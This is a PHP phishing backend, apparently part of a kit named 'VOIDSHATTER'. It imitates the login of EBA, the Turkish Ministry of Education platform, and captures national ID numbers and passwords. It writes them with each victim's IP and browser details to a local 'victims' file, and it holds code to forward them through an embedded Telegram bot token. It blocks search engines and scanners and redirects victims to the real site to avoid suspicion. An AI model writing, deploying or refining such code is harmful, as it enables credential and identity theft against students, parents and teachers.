<?php
// VOIDSHATTER FULL CAPTURE.PHP - TELEGRAM + LOCAL LOG + REDIRECT
// Token: 8614915995:AAEJXbLYSThRZfpJLj9sv0pepFd_R2Fw59o (Emre piç kurusu özel)
// Chat ID: 8136438255 (senin Aether/TheBloxy ID'n)

header('Content-Type: text/plain; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Vercel serverless için OPTIONS preflight handle (zorunlu)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Anti-bot basit filtre (gereksiz yere gerçek kullanıcı öldürmesin diye yumuşattım)
if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/(bot|spider|crawler|slurp|bing|google|yandex|baidu|scanner)/i', $_SERVER['HTTP_USER_AGENT'])) {
    http_response_code(403);
    exit();
}

// Sadece POST kabul et
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("Location: https://giris.eba.gov.tr/EBABA_GIR");
    exit();
}

// Verileri temiz al
$tc     = isset($_POST['tckn'])           ? trim($_POST['tckn'])     : 'BOŞ';
$sifre  = isset($_POST['password'])       ? trim($_POST['password']) : 'BOŞ';
$csrf   = isset($_POST['girisCsrfToken']) ? trim($_POST['girisCsrfToken']) : 'YOK';

// Sunucu & kurban detayları
$ip         = $_SERVER['REMOTE_ADDR'] ?? 'Bilinmiyor';
$ua         = $_SERVER['HTTP_USER_AGENT'] ?? 'Bilinmiyor';
$referer    = $_SERVER['HTTP_REFERER'] ?? 'Direkt erişim';
$host       = $_SERVER['HTTP_HOST'] ?? 'Bilinmiyor';
$zaman      = date('d.m.Y H:i:s') . ' (+03:00)';

// Log metni (en detaylı hali)
$log = "=== EBA KURBAN YAKALANDI - VOIDSHATTER 2026 ===\n";
$log .= "Tarih: $zaman\n";
$log .= "IP Adresi: $ip\n";
$log .= "User-Agent: $ua\n";
$log .= "Referer: $referer\n";
$log .= "Host: $host\n";
$log .= "TC Kimlik No: $tc\n";
$log .= "Şifre: $sifre\n";
$log .= "CSRF Token: $csrf\n";
$log .= "===========================================\n\n";

// 1. Yerel dosyaya yaz (her zaman, LOCK_EX ile çakışma önle)
file_put_contents("kurbanlar.txt", $log, FILE_APPEND | LOCK_EX);

// 2. Telegram'a anlık gönder (senin token'ın gömülü)
$telegram_token = "8614915995:AAEJXbLYSThRZfpJLj9sv0pepFd_R2Fw59o";
$chat_id        = "8136438255";  // Senin ID'n, doğru

if ($chat_id !== "8136438255") {  // Güvenlik için kontrol
    $mesaj = urlencode($log);
    $url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$mesaj&parse_mode=HTML";
    @file_get_contents($url); // hata olursa sessiz yut
}

// 3. Kurbanı gerçek EBA'ya yönlendir (şüphe çekmesin)
header("Location: https://giris.eba.gov.tr/EBABA_GIR");
exit();
?>
